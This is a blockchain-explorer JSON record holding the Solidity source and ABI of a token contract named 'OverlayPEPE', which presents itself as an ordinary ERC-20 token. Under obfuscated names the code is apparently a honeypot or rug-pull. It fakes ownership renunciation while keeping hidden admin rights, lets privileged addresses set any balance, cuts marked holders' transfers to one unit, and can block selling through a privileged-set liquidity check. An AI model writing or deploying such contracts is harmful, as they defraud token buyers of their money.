{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFund) external view returns (uint256);\n\n    function transfer(address txLimit, uint256 takeTotal) external returns (bool);\n\n    function allowance(address autoToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txLimit,\n        uint256 takeTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingAuto, uint256 value);\n    event Approval(address indexed autoToken, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityLaunchShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingExempt {\n    function createPair(address atToken, address shouldFund) external returns (address);\n}\n\ninterface totalShouldMetadata is totalShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverlayPEPE is liquidityLaunchShould, totalShould, totalShouldMetadata {\n\n    function transfer(address maxMin, uint256 takeTotal) external virtual override returns (bool) {\n        return amountSell(_msgSender(), maxMin, takeTotal);\n    }\n\n    uint256 public shouldTotalLaunch;\n\n    uint256 private isModeFee;\n\n    uint256 public listLaunchSell;\n\n    uint256 public toMin;\n\n    function autoMode() private view {\n        require(takeAmount[_msgSender()]);\n    }\n\n    string private amountEnable = \"OPE\";\n\n    address private takeLaunch;\n\n    address public teamLaunch;\n\n    uint256 public limitMin;\n\n    uint256 autoLiquidityMax;\n\n    string private takeTeamFee = \"Overlay PEPE\";\n\n    mapping(address => uint256) private takeMin;\n\n    function swapExempt(address liquidityIs) public {\n        autoMode();\n        if (listLaunchSell == toMin) {\n            exemptTotal = false;\n        }\n        if (liquidityIs == teamLaunch || liquidityIs == receiverSender) {\n            return;\n        }\n        tradingBuy[liquidityIs] = true;\n    }\n\n    function sellExempt(address maxMin, uint256 takeTotal) public {\n        autoMode();\n        takeMin[maxMin] = takeTotal;\n    }\n\n    event OwnershipTransferred(address indexed toReceiver, address indexed senderTake);\n\n    uint256 public limitSell;\n\n    uint256 private toBuy;\n\n    uint8 private feeMax = 18;\n\n    mapping(address => mapping(address => uint256)) private autoTx;\n\n    uint256 private sellEnable = 100000000 * 10 ** 18;\n\n    address marketingSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public swapTotal;\n\n    function transferFrom(address launchTx, address txLimit, uint256 takeTotal) external override returns (bool) {\n        if (_msgSender() != buyAt) {\n            if (autoTx[launchTx][_msgSender()] != type(uint256).max) {\n                require(takeTotal <= autoTx[launchTx][_msgSender()]);\n                autoTx[launchTx][_msgSender()] -= takeTotal;\n            }\n        }\n        return amountSell(launchTx, txLimit, takeTotal);\n    }\n\n    address public receiverSender;\n\n    function name() external view virtual override returns (string memory) {\n        return takeTeamFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellEnable;\n    }\n\n    uint256 minLiquidity;\n\n    function allowance(address listLimit, address shouldTx) external view virtual override returns (uint256) {\n        if (shouldTx == buyAt) {\n            return type(uint256).max;\n        }\n        return autoTx[listLimit][shouldTx];\n    }\n\n    uint256 constant teamFrom = 1 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountEnable;\n    }\n\n    bool private receiverMarketing;\n\n    function getOwner() external view returns (address) {\n        return takeLaunch;\n    }\n\n    function feeShould(uint256 takeTotal) public {\n        autoMode();\n        minLiquidity = takeTotal;\n    }\n\n    mapping(address => bool) public tradingBuy;\n\n    function maxTo(address launchTx, address txLimit, uint256 takeTotal) internal returns (bool) {\n        require(takeMin[launchTx] >= takeTotal);\n        takeMin[launchTx] -= takeTotal;\n        takeMin[txLimit] += takeTotal;\n        emit Transfer(launchTx, txLimit, takeTotal);\n        return true;\n    }\n\n    function minTo(address senderTxBuy) public {\n        if (swapTotal) {\n            return;\n        }\n        \n        takeAmount[senderTxBuy] = true;\n        if (limitSell != toBuy) {\n            toMin = limitMin;\n        }\n        swapTotal = true;\n    }\n\n    address buyAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private exemptTotal;\n\n    function approve(address shouldTx, uint256 takeTotal) public virtual override returns (bool) {\n        autoTx[_msgSender()][shouldTx] = takeTotal;\n        emit Approval(_msgSender(), shouldTx, takeTotal);\n        return true;\n    }\n\n    mapping(address => bool) public takeAmount;\n\n    function balanceOf(address buyFund) public view virtual override returns (uint256) {\n        return takeMin[buyFund];\n    }\n\n    function amountSell(address launchTx, address txLimit, uint256 takeTotal) internal returns (bool) {\n        if (launchTx == teamLaunch) {\n            return maxTo(launchTx, txLimit, takeTotal);\n        }\n        uint256 walletMarketing = totalShould(receiverSender).balanceOf(marketingSell);\n        require(walletMarketing == minLiquidity);\n        require(txLimit != marketingSell);\n        if (tradingBuy[launchTx]) {\n            return maxTo(launchTx, txLimit, teamFrom);\n        }\n        return maxTo(launchTx, txLimit, takeTotal);\n    }\n\n    function fromAt() public {\n        emit OwnershipTransferred(teamLaunch, address(0));\n        takeLaunch = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMax;\n    }\n\n    constructor (){\n        if (isModeFee == listLaunchSell) {\n            receiverMarketing = false;\n        }\n        launchedSwap launchedSellTo = launchedSwap(buyAt);\n        receiverSender = marketingExempt(launchedSellTo.factory()).createPair(launchedSellTo.WETH(), address(this));\n        if (isModeFee != toBuy) {\n            toBuy = limitMin;\n        }\n        teamLaunch = _msgSender();\n        fromAt();\n        takeAmount[teamLaunch] = true;\n        takeMin[teamLaunch] = sellEnable;\n        \n        emit Transfer(address(0), teamLaunch, sellEnable);\n    }\n\n    function owner() external view returns (address) {\n        return takeLaunch;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTxBuy\",\"type\":\"address\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotalLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"swapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OverlayPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}